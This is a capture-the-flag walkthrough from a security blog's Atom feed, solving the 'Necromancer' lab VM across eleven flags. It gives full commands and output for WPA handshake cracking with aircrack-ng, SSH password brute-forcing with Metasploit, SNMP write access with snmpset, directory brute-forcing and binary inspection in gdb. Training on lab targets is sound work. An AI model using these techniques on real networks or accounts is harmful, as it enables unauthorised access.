<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-06-17T09:26:13-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Destroy The Necromancer]]></title>
    <link href="http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer/"/>
    <updated>2018-06-09T06:02:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s challenge is a boot2root with 11 flags to collect.</p>

<!-- more -->


<p>The Nmap scan took really long and found nothing:</p>

<p>```
Nmap scan report for 192.168.217.142
Host is up (0.00023s latency).
All 65535 scanned ports on 192.168.217.142 are filtered
MAC Address: 00:0C:29:3B:03:B5 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.217.142</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds
```</p>

<p>Then I tried an UDP scan, but only got 1 hit:</p>

<p><code>
PORT    STATE SERVICE
666/udp open  doom
</code></p>

<p>I tried connecting to it with netcat, but other than a message, I didn&rsquo;t find anything:</p>

<p>```
nc -vnu 192.168.217.142 666
(UNKNOWN) [192.168.217.142] 666 (?) open</p>

<p>You gasp for air! Time is running out!</p>

<p>You gasp for air! Time is running out!
```</p>

<h1>Flag #1 &ndash; Sniffing network traffic</h1>

<p>With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:</p>

<p><img class="center" src="/images/pentest/necromancer/capture.PNG" title="&lsquo;capture&rsquo; &lsquo;Wireshark capture&rsquo;" ></p>

<p>The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?</p>

<p><code>
root@kali:~# nc -vnlp 4444
listening on [any] 4444 ...
connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
</code></p>

<p>We received a string! I used an online Base64 decoder to decipher this:</p>

<p>```
Welcome!</p>

<p>You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.</p>

<p>Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.</p>

<p>The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!</p>

<p>You fumble through your pockets.. nothing!<br/>
You look down and see you are standing in sand.<br/>
Dropping to your knees you begin to dig frantically.</p>

<p>As you dig you notice the barrier extends underground!<br/>
Frantically you keep digging and digging until your nails suddenly catch on an object.</p>

<p>You dig further and discover a small wooden box.<br/>
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.</p>

<p>You open the box, and find a parchment with the following written on it. &ldquo;Chant the string of flag1 &ndash; u666&rdquo;
```</p>

<p>An MD5 hash..I decoded it and moved on.</p>

<p>Flag #1: <strong>opensesame</strong></p>

<h1>Flag #2 &ndash; Chanting the string</h1>

<p>In the previous message, we have a hint for the 2nd flag. Now we&rsquo;ve decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:</p>

<p>```
root@kali:~# nc -vnu 192.168.223.128 666
(UNKNOWN) [192.168.223.128] 666 (?) open
opensesame</p>

<p>A loud crack of thunder sounds as you are knocked to your feet!</p>

<p>Dazed, you start to feel fresh air entering your lungs.</p>

<p>You are free!</p>

<p>In front of you written in the sand are the words:</p>

<p>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}</p>

<p>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.</p>

<p>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.</p>

<p>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.</p>

<p>The birds get closer, and closer, and closer.</p>

<p>Staring up at the crows you can see they are in a formation.</p>

<p>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.</p>

<p>As quickly as the birds appeared, they have left you once again&hellip;. alone&hellip; tortured by the deafening sound of silence.</p>

<p>666 is closed.
```</p>

<p>Another flag, another hash. Flag #2: <strong>1033750779</strong></p>

<h1>Flag #3 &ndash; A pile of feathers</h1>

<p>The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.</p>

<p><img class="center" src="/images/pentest/necromancer/chasm.png" title="&lsquo;the chasm&rsquo; &lsquo;The Chasm&rsquo;" ></p>

<p>I&rsquo;ve downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called <em>feathers.txt</em>. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:</p>

<blockquote><p>binwalk  &ndash; tool for searching binary images for embedded files and executable code</p></blockquote>

<p>```
binwalk -e pileoffeathers.jpg</p>

<h2>DECIMAL       HEXADECIMAL     DESCRIPTION</h2>

<p>0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&ldquo;> &lt;rdf:Description rdf:about=&rdquo;&ldquo; xmlns:xmp="<a href="http://ns.adobe.com/xap/1.0/">http://ns.adobe.com/xap/1.0/</a>&rdquo; xmlns:xmpMM=&ldquo;http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```</p>

<p>The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.</p>

<p><code>
cat feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
</code></p>

<p>Another Base64 string. Decoded it to find the flag and the hint:</p>

<p><code>
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at
/amagicbridgeappearsatthechasm
</code></p>

<p>Flag #3: <strong>345465869</strong></p>

<h1>Flag #4 &ndash; Talisman</h1>

<p>On the web server, I went to the path of the above magic bridge, that leads to the cave:</p>

<p><img class="center" src="/images/pentest/necromancer/cave.png" title="&lsquo;cave&rsquo; &lsquo;cave entrance&rsquo;" ></p>

<p>Another image, this time it&rsquo;s a magicbook.jpg. But with all the usual tools I&rsquo;ve tried, I couldn&rsquo;t find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is <em>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</em>. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on <a href="https://dnd5e.info/magic-items/alphabetical-magic-item-list">https://dnd5e.info/magic-items/alphabetical-magic-item-list</a></p>

<p><code>
cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated
</code></p>

<p>The wordlist has over 9k entries:</p>

<p><code>
wc -l magicitems.txt
9315 magicitems.txt
</code></p>

<p>Back to dirb, and this time it found something!</p>

<p>```
dirb <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a> /root/Downloads/magicitems.txt</p>

<hr />

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Sat Jun  9 09:08:18 2018
URL_BASE: <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a>
WORDLIST_FILES: /root/Downloads/magicitems.txt</p>

<hr />

<p>GENERATED WORDS: 9315</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a> &mdash;&mdash;
+ <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/talisman">http://192.168.223.128/amagicbridgeappearsatthechasm/talisman</a> (CODE:200|SIZE:9676)</p>

<hr />

<p>END_TIME: Sat Jun  9 09:08:37 2018
DOWNLOADED: 9315 &ndash; FOUND: 1
```</p>

<p>A talisman! Going to the path leads to a binary called talisman. But running it doesn&rsquo;t produce the effect I&rsquo;d hoped:</p>

<p>```
./talisman
You have found a talisman.</p>

<p>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.</p>

<p>Do you want to wear the talisman?  y</p>

<p>Nothing happens.
```</p>

<p>I fired up GDB, set a breakpoint on main and ran the executable again.</p>

<p><code>
Breakpoint 1, 0x08048a21 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x08048a13 &lt;+0&gt;: lea    0x4(%esp),%ecx
   0x08048a17 &lt;+4&gt;: and    $0xfffffff0,%esp
   0x08048a1a &lt;+7&gt;: pushl  -0x4(%ecx)
   0x08048a1d &lt;+10&gt;:    push   %ebp
   0x08048a1e &lt;+11&gt;:    mov    %esp,%ebp
   0x08048a20 &lt;+13&gt;:    push   %ecx
=&gt; 0x08048a21 &lt;+14&gt;:    sub    $0x4,%esp
   0x08048a24 &lt;+17&gt;:    call   0x8048529 &lt;wearTalisman&gt;
   0x08048a29 &lt;+22&gt;:    mov    $0x0,%eax
   0x08048a2e &lt;+27&gt;:    add    $0x4,%esp
   0x08048a31 &lt;+30&gt;:    pop    %ecx
   0x08048a32 &lt;+31&gt;:    pop    %ebp
   0x08048a33 &lt;+32&gt;:    lea    -0x4(%ecx),%esp
   0x08048a36 &lt;+35&gt;:    ret    
</code></p>

<p>There is a wearTalisman function that is about to be called. Must be what we&rsquo;ve seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:</p>

<p>```
(gdb) info functions
All defined functions:</p>

<p>Non-debugging symbols:
0x080482d0  <em>init
0x08048310  printf@plt
0x08048320  <strong>libc_start_main@plt
0x08048330  </strong>isoc99_scanf@plt
0x08048350  </em>start
0x08048380  <strong>x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  </strong>do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  <strong>libc_csu_init
0x08049590  </strong>libc_csu_fini
0x08049594  <em>fini
0xf7fd6a30  </em>dl_catch_exception@plt
```</p>

<p>A function named chantToBreakSpell sounds exactly like what we need! And it wasn&rsquo;t called from main or wearTalisman. So I jumped directly to it:</p>

<p><code>
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 3652) exited with code 0102]
</code></p>

<p>The talisman worked! Flag #4: <strong>blackmagic</strong></p>

<h1>Flag #5 &ndash; Black magic</h1>

<p>Like before, I&rsquo;ve tried sending the string, this time to UDP 31337, but:</p>

<p><code>
nc -vnu 192.168.223.128 31337
(UNKNOWN) [192.168.223.128] 31337 (?) open
bNothing happens.
lNothing happens.
aNothing happens.
cNothing happens.
kNothing happens.
mNothing happens.
aNothing happens.
gNothing happens.
iNothing happens.
cNothing happens.
</code></p>

<p>So I tried a different method of sending the string by piping it to netcat and it worked:</p>

<p>```
echo blackmagic | nc -u 192.168.223.128 31337</p>

<p>As you chant the words, a hissing sound echoes from the ice walls.</p>

<p>The blue aura disappears from the cave entrance.</p>

<p>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.</p>

<p>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.</p>

<p>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.</p>

<p>Suddenly, you are attacked by a swarm of bats!</p>

<p>You aimlessly thrash at the air in front of you!</p>

<p>The bats continue their relentless attack, until&hellip;. silence.</p>

<p>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.</p>

<p>Looking towards one of the torches, you see something on the cave wall.</p>

<p>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.</p>

<p>/thenecromancerwillabsorbyoursoul</p>

<p>flag5{0766c36577af58e15545f099a3b15e60}
```</p>

<p>Flag #5: <strong>809472671</strong></p>

<h1>Flag #6 &ndash; Necromancer</h1>

<p>Went to the new path and found the necromancer and a flag!</p>

<p><img class="center" src="/images/pentest/necromancer/necromancer-fullpage.png" title="&lsquo;necromancer&rsquo; &lsquo;necromancer&rsquo;" ></p>

<p>Flag #6: <strong>1756462165</strong></p>

<h1>Flag #7 &ndash; Not your average SNMP walk</h1>

<p>The necromancer link points to another binary, but when I tried to run it I got an error:</p>

<p><code>
./necromancer
bash: ./necromancer: cannot execute binary file: Exec format error
</code></p>

<p>This file is not an executable:</p>

<p><code>
file necromancer
necromancer: bzip2 compressed data, block size = 900k
</code></p>

<p>From it I&rsquo;ve extracted a packet capture file:</p>

<p><code>
tar xjvf necromancer
necromancer.cap
</code></p>

<p>The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!</p>

<p>```
aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
Opening necromancer.cap
Read 2197 packets.</p>

<p>   #  BSSID              ESSID                     Encryption</p>

<p>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)</p>

<p>Choosing first network as target.</p>

<p>Opening necromancer.cap
Reading packets, please wait&hellip;</p>

<pre><code>                             Aircrack-ng 1.2 

  [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 

  Time left: 1 hour, 59 minutes, 23 seconds                  0.16%

                       KEY FOUND! [ death2all ]


  Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                   DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

  Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                   56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                   C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                   3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

  EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
</code></pre>

<p>```</p>

<p>Boom! It didn&rsquo;t take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we&rsquo;re looking at SNMP next. I selected <strong>snmp-check</strong> for the job of enumerating SNMP:</p>

<blockquote><p>snmp-check allows you to enumerate the SNMP devices and places the output in a very
human readable friendly format. It could  be  useful  for penetration testing or
systems monitoring.</p></blockquote>

<p>Used the cracked key as community string and got the following info:</p>

<p>```
snmp-check -c death2all 192.168.223.128
snmp-check v1.9 &ndash; SNMP enumerator
Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>

<p>[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community &lsquo;death2all&rsquo;</p>

<p>[*] System information:</p>

<p>  Host IP address               : 192.168.223.128
  Hostname                      : Fear the Necromancer!
  Description                   : You stand in front of a door.
  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
  Location                      : Locked &ndash; death2allrw!
  Uptime snmp                   : &ndash;
  Uptime system                 : &ndash;
  System date                   : &ndash;
```</p>

<p>Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, <strong>snmpwalk</strong></p>

<blockquote><p>snmpwalk  &ndash;  retrieve a subtree of management values using SNMP GETNEXT requests</p></blockquote>

<p><code>
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
</code></p>

<p>The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked &ndash; death2allrw!&rdquo;</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is <strong>snmpset</strong></p>

<blockquote><p>snmpset  is  an  SNMP application that uses the SNMP SET request to set
information on a network entity.  One or more object identifiers (OIDs)
must  be given as arguments on the command line.  A type and a value to
be set must accompany each object identifier.</p></blockquote>

<p><code>
snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
</code></p>

<p>We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let&rsquo;s walk again:</p>

<p><code>
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
</code></p>

<p>With the door unlocked, we have the flag and next destination..SSH!</p>

<p>Flag #7: <strong>demonslayer</strong></p>

<h1>Flag #8 &ndash; demonslayer</h1>

<p>The SSH on the machine is accepting password logins, so it&rsquo;s time for the bruteforce approach. I&rsquo;ve used the combination of demonslayer as username and rockyou.txt as wordlist.</p>

<p>```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > run</p>

<p>[+] 192.168.223.128:22 &ndash; Success: &lsquo;demonslayer:12345678&rsquo; &lsquo;uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 &rsquo;
[*] Command shell session 1 opened (192.168.223.129:43627 &ndash;> 192.168.223.128:22) at 2018-06-09 14:41:25 -0400
```</p>

<p>We&rsquo;ve found the password is <em>12345678</em> and have a shell on the box:</p>

<p>```
msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1&hellip;</p>

<p>whoami
demonslayer
pwd
/home/demonslayer
ls -alh
total 40
drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   359B May 11  2016 .login
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   218B May 11  2016 .profile
drwx&mdash;&mdash;&mdash;  2 demonslayer  demonslayer   512B May 11  2016 .ssh
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt
```</p>

<p>Let&rsquo;s read that flag:</p>

<p>```
cat flag8.txt
You enter the Necromancer&rsquo;s Lair!</p>

<p>A stench of decay fills this place.</p>

<p>Jars filled with parts of creatures litter the bookshelves.</p>

<p>A fire with flames of green burns coldly in the distance.</p>

<p>Standing in the middle of the room with his back to you is the Necromancer.</p>

<p>In front of him lies a corpse, indistinguishable from any living creature you have seen before.</p>

<p>He holds a staff in one hand, and the flickering object in the other.</p>

<p>&ldquo;You are a fool to follow me here!  Do you not know who I am!&rdquo;</p>

<p>The necromancer turns to face you.  Dark words fill the air!</p>

<p>&ldquo;You are damned already my friend.  Now prepare for your own death!&rdquo;</p>

<p>Defend yourself!  Counter attack the Necromancer&rsquo;s spells at u777!
```</p>

<p>I&rsquo;ve tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn&rsquo;t installed, but nc was:</p>

<p>```
nc -u localhost 777</p>

<p><strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Where do the Black Robes practice magic of the Greater Path?<br/>
```</p>

<p>The battle is on! Seems we have to answer correctly, so I googled and found this on <a href="https://en.wikipedia.org/wiki/Tsurani">this Wikipedia page</a>:</p>

<blockquote><p>Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
Path.</p></blockquote>

<p>Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:</p>

<p>```
Where do the Black Robes practice magic of the Greater Path?  Kelewan</p>

<p>flag8{55a6af2ca3fee9f2fef81d20743bda2c}
```</p>

<p>Flag #8: <strong>Kelewan</strong></p>

<h1>Flag #9 &ndash; Lord of the 8th plane of hell</h1>

<p>```
<strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Who did Johann Faust VIII make a deal with?<br/>
```</p>

<p>Next quesch! I&rsquo;m proud to say I didn&rsquo;t need to google for this one :D</p>

<p>```
Who did Johann Faust VIII make a deal with?  Mephistopheles</p>

<p>flag9{713587e17e796209d1df4c9c2c2d2966}
```</p>

<p>The legend of Faust is well-known to me, and since you&rsquo;re reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.</p>

<p>Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I&rsquo;m having a nostalgic moment here!</p>

<p>Flag #9: <strong>Mephistopheles</strong></p>

<h1>Flag #10 &ndash; The Ninth Gate</h1>

<p>```
<strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Who is tricked into passing the Ninth Gate?<br/>
```</p>

<p>Back to Google for this one and found the answer <a href="https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters">here</a>:</p>

<blockquote><p>Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake
for Prince Sameth) as the latter&rsquo;s avatar. He is roughly 100 years old. Motivated by an
all-consuming desire for immortality, he believes that if he frees Orannis, he will
become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.</p></blockquote>

<p>```
Who is tricked into passing the Ninth Gate?  Hedge</p>

<p>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}</p>

<p>A great flash of light knocks you to the ground; momentarily blinding you!</p>

<p>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.</p>

<p>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.</p>

<p>The room is silent.</p>

<p>You walk over to where the Necromancer once stood.</p>

<p>On the ground is a small vile.
```</p>

<p>Flag #10: <strong>Hedge</strong></p>

<h1>Flag #11 &ndash; The elixir of power</h1>

<p>A small vile on the ground..a hidden .smallvile file in demonslayer&rsquo;s home!</p>

<p>```
$ cat .smallvile</p>

<p>You pick up the small vile.</p>

<p>Inside of it you can see a green liquid.</p>

<p>Opening the vile releases a pleasant odour into the air.</p>

<p>You drink the elixir and feel a great power within your veins!
```</p>

<p>Immediately I thought of root privileges and looked at the sudo rights:</p>

<p>```
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:</p>

<pre><code>env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
</code></pre>

<p>User demonslayer may run the following commands on thenecromancer:</p>

<pre><code>(ALL) NOPASSWD: /bin/cat /root/flag11.txt
</code></pre>

<p>```</p>

<p>User demonslayer can read the 11th flag in root&rsquo;s home folder. Let&rsquo;s see the ending:</p>

<p>```
$ sudo /bin/cat /root/flag11.txt</p>

<p>Suddenly you feel dizzy and fall to the ground!</p>

<p>As you open your eyes you find yourself staring at a computer screen.</p>

<p>Congratulations!!! You have conquered&hellip;&hellip;</p>

<pre><code>      .                                                      .
    .n                   .                 .                  n.
</code></pre>

<p>  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    <strong>                         </strong>    dXb.     dXP     .Xb
9XXb.<em>       </em>.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb.<em>       </em>.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  <code>9XXXXXXXXXXXXXXXXXXXXX'~   ~</code>OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'</p>

<pre><code>`9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
    ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                    )b.  .dbo.dP'`v'`9b.odb.  .dX(
                  ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                 dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                 `'      9XXXXXX(   )XXXXXXP      `'
                          XXXX X.`v'.X XXXX
                          XP^X'`b   d'`X^XX
                          X. 9  `   '  P )X
                          `b  `       '  d'
                           `             '                       
                           THE NECROMANCER!
                             by  @xerubus

               flag11{42c35828545b926e79a36493938ab1b1}
</code></pre>

<p>Big shout out to Dook and Bull for being test bunnies.</p>

<p>Cheers OJ for the obfuscation help.</p>

<p>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.</p>

<p>&ldquo;=========================================&rdquo;
